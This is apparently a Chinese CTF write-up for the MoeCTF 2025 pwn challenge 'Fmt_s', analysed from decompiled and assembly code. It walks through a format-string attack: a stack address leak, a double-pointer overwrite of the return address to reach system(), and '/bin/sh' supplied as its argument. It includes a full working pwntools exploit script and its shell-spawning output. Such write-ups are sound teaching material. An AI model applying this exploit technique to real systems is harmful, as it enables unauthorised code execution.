---
title: 'XiDianCTF MoeCTF 2025 PWN Fmt_s'
date: '2026-09-18T11:01:53+08:00'
lastmod: '2026-09-18T11:01:53+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=890)

拖进IDA。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  puts("You're walking down the road when a monster appear.");
  for ( i = 1; i <= 3 && !flag; ++i )
    talk();
  if ( (unsigned __int64)atk <= 0x1BF52 )
    puts("You've been eaten by the monster.");
  else
    he();
  return 0;
}
```

```c
__int64 talk()
{
  puts("You start talking to him...");
  flag ^= 1u;
  read(0, fmt, 0x20uLL);
  printf(fmt);
  puts("?");
  puts("You enraged the monster-prepare for battle!");
  return my_read(&atk, 8LL);
}
size_t __fastcall my_read(_BYTE *a1, size_t a2)
{
  a1[read(0, a1, a2)] = 0;
  return strlen(a1);
}
```

```c
unsigned __int64 he()
{
  char command[6]; // [rsp+2h] [rbp-Eh] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  qmemcpy(command, "a_flag", sizeof(command));
  puts("The monster is defeated, and you obtain: flag?");
  system(command);
  return v2 - __readfsqword(0x28u);
}
```

注意到`my_read()`会在读入8字节后将`a1[8]`置为0，也就是将`flag`置零，可以保证能够完成三次循环。

栈上没有指向`talk()`返回地址的指针，所以我们需要一个二级指针来修改一级指针后使用修改后的一级指针来修改返回地址。

其实也可以直接用一级指针来修改其指向为任意地址，但`fmt`修改过多字节会发送极其多的字符

```
00:0000│ rsp 0x7fffffffd5e0 —▸ 0x7fffffffd728 —▸ 0x7fffffffd9fb ◂— '/path/to/pwn_patched'
01:0008│-008 0x7fffffffd5e8 —▸ 0x40136f (main) ◂— endbr64
02:0010│ rbp 0x7fffffffd5f0 —▸ 0x7fffffffd610 ◂— 1
03:0018│+008 0x7fffffffd5f8 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 1		<---返回地址
04:0020│+010 0x7fffffffd600 ◂— 0
05:0028│+018 0x7fffffffd608 ◂— 0x100000000
06:0030│+020 0x7fffffffd610 ◂— 1
07:0038│+028 0x7fffffffd618 —▸ 0x7ffff7c29d90 ◂— mov edi, eax
08:0040│+030 0x7fffffffd620 ◂— 0
09:0048│+038 0x7fffffffd628 —▸ 0x40136f (main) ◂— endbr64
0a:0050│+040 0x7fffffffd630 ◂— 0x100000000
0b:0058│+048 0x7fffffffd638 —▸ 0x7fffffffd728 —▸ 0x7fffffffd9fb ◂— '/path/to/pwn_patched'	<---二级指针
0c:0060│+050 0x7fffffffd640 ◂— 0
0d:0068│+058 0x7fffffffd648 ◂— 0x90d493944c78dce8
0e:0070│+060 0x7fffffffd650 —▸ 0x7fffffffd728 —▸ 0x7fffffffd9fb ◂— '/path/to/pwn_patched'
0f:0078│+068 0x7fffffffd658 —▸ 0x40136f (main) ◂— endbr64
10:0080│+070 0x7fffffffd660 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64
11:0088│+078 0x7fffffffd668 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
12:0090│+080 0x7fffffffd670 ◂— 0x6f2b6c6be03adce8
13:0098│+088 0x7fffffffd678 ◂— 0x6f2b7c1176f2dce8
14:00a0│+090 0x7fffffffd680 ◂— 0x7fff00000000
15:00a8│+098 0x7fffffffd688 ◂— 0
... ↓        3 skipped
19:00c8│+0b8 0x7fffffffd6a8 ◂— 0xa31676bfe7cb7100
1a:00d0│+0c0 0x7fffffffd6b0 ◂— 0
1b:00d8│+0c8 0x7fffffffd6b8 —▸ 0x7ffff7c29e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]
1c:00e0│+0d0 0x7fffffffd6c0 —▸ 0x7fffffffd738 —▸ 0x7fffffffda1e ◂— 'SHELL=/bin/bash'
1d:00e8│+0d8 0x7fffffffd6c8 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64
1e:00f0│+0e0 0x7fffffffd6d0 —▸ 0x7ffff7ffe2e0 ◂— 0
1f:00f8│+0e8 0x7fffffffd6d8 ◂— 0
20:0100│+0f0 0x7fffffffd6e0 ◂— 0
21:0108│+0f8 0x7fffffffd6e8 —▸ 0x401110 (_start) ◂— endbr64
22:0110│+100 0x7fffffffd6f0 —▸ 0x7fffffffd720 ◂— 1
23:0118│+108 0x7fffffffd6f8 ◂— 0
24:0120│+110 0x7fffffffd700 ◂— 0
25:0128│+118 0x7fffffffd708 —▸ 0x401135 (_start+37) ◂— hlt
26:0130│+120 0x7fffffffd710 —▸ 0x7fffffffd718 ◂— 0x1c
27:0138│+128 0x7fffffffd718 ◂— 0x1c
28:0140│+130 0x7fffffffd720 ◂— 1
29:0148│ r12 0x7fffffffd728 —▸ 0x7fffffffd9fb ◂— '/home/qingkong/CTFtemp/pwn_patched'	<---二级指针指向的一级指针
2a:0150│+140 0x7fffffffd730 ◂— 0
2b:0158│+148 0x7fffffffd738 —▸ 0x7fffffffda1e ◂— 'SHELL=/bin/bash'
2c:0160│+150 0x7fffffffd740 —▸ 0x7fffffffda2e ◂— 'WSL2_GUI_APPS_ENABLED=1'
2d:0168│+158 0x7fffffffd748 —▸ 0x7fffffffda46 ◂— 'WSL_DISTRO_NAME=Ubuntu-24.04'
```

> 注意1: 我们不应该选择任何`0x7fffffffd620`也就是`$rbp`以前的栈地址，修改会在`talk()`退出后丢失。
>
> 注意2: 题目已提供了`libc.so.6`和`ld-linux-x86-64.so.2`，为了保证和远端的一致性，我们需要patch后再进行调试分析。

三次`talk()`一次泄露，一次利用二级指针修改一级指针，一次利用一级指针修改返回地址。

程序并没有开启`PIE`，我们直接写死跳转到system即可。

并且

```assembly
; Attributes: bp-based frame

; size_t __fastcall my_read(_BYTE *, size_t)
public my_read
my_read proc near

nbytes= qword ptr -20h
buf= qword ptr -18h
var_8= qword ptr -8

; __unwind {
endbr64
push    rbp
mov     rbp, rsp
sub     rsp, 20h
mov     [rbp+buf], rdi
mov     [rbp+nbytes], rsi
mov     rdx, [rbp+nbytes] ; nbytes
mov     rax, [rbp+buf]
mov     rsi, rax        ; buf
mov     edi, 0          ; fd
call    _read
mov     [rbp+var_8], rax
mov     rdx, [rbp+buf]
mov     rax, [rbp+var_8]
add     rax, rdx
mov     byte ptr [rax], 0
mov     rax, [rbp+buf]
mov     rdi, rax        ; s
call    _strlen
leave
retn
; } // starts at 401297
my_read endp
```

`my_read()`最后会将`buf`赋值给`$rdi`。我们直接输入`/bin/sh`即可。



脚本:

```python
from pwn import *
import ctypes
import shutil
import logging

pwndbg = shutil.which("pwndbg")
context(arch='amd64', os='linux', log_level='debug')
io = connect("127.0.0.1" ,18284)

io.recvuntil(b'him...')
io.send(b'%6$p')

io.recvuntil(b'0x')
p = io.recv(12)
print(p)
p = int(p, 16)
print(hex(p))

io.recvuntil(b'battle!')
io.send(b'12342234')

io.recvuntil(b'him...')
print(hex(p - 0x8 * 38))
print(hex((p - 0x8 * 38) & 0xffff))
io.send(f"%{int((p - 0x8 * 38) & 0xffff)}c%17$hn".encode())

io.recvuntil(b'battle!')
io.send(b'32344234')

systemAdd = 0x40127b
io.recvuntil(b'him...')
print(hex((systemAdd) & 0xffff))
io.send(f"%{int((systemAdd) & 0xffff)}c%47$hn".encode())

io.recvuntil(b'battle!')
io.send(b'/bin/sh\x00')


io.interactive()
```

输出:

```
[x] Opening connection to 127.0.0.1 on port 18284
[x] Opening connection to 127.0.0.1 on port 18284: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 18284: Done
[DEBUG] Received 0x50 bytes:
    b"You're walking down the road when a monster appear.\n"
    b'You start talking to him...\n'
[DEBUG] Sent 0x4 bytes:
    b'%6$p'
[DEBUG] Received 0xe bytes:
    b'0x7fff0897ce98'
b'7fff0897ce98'
0x7fff0897ce98
[DEBUG] Received 0x2e bytes:
    b'?\n'
    b'You enraged the monster-prepare for battle!\n'
[DEBUG] Sent 0x8 bytes:
    b'12342234'
[DEBUG] Received 0x1b bytes:
    b'You start talking to him...'
0x7fff0897cd68
0xcd68
[DEBUG] Sent 0xd bytes:
    b'%52584c%17$hn'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received ...
[DEBUG] Received 0xd96 bytes:
    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000d60  20 20 20 20  20 20 20 c0  3f 0a 59 6f  75 20 65 6e  │    │   ·│?·Yo│u en│
    00000d70  72 61 67 65  64 20 74 68  65 20 6d 6f  6e 73 74 65  │rage│d th│e mo│nste│
    00000d80  72 2d 70 72  65 70 61 72  65 20 66 6f  72 20 62 61  │r-pr│epar│e fo│r ba│
    00000d90  74 74 6c 65  21 0a                                  │ttle│!·│
    00000d96
[DEBUG] Sent 0x8 bytes:
    b'32344234'
[DEBUG] Received 0x1c bytes:
    b'You start talking to him...\n'
0x127b
[DEBUG] Sent 0xc bytes:
    b'%4731c%47$hn'
[DEBUG] Received 0x1000 bytes:
    b' ' * 0x1000
[DEBUG] Received 0x27c bytes:
    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000270  20 20 20 20  20 20 20 20  20 20 c0 6e               │    │    │  ·n│
    0000027c
[DEBUG] Received 0x2e bytes:
    b'?\n'
    b'You enraged the monster-prepare for battle!\n'
[DEBUG] Sent 0x8 bytes:
    00000000  2f 62 69 6e  2f 73 68 00                            │/bin│/sh·│
    00000008
[*] Switching to interactive mode

$ ls

[DEBUG] Sent ...
[DEBUG] Received ...

bin
flag
lib
lib32
lib64
libexec
libx32
pwn

$ cat flag 
[DEBUG] Sent ...
[DEBUG] Received ...
moectf{THIS_IS_FLAG}
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 18284
```

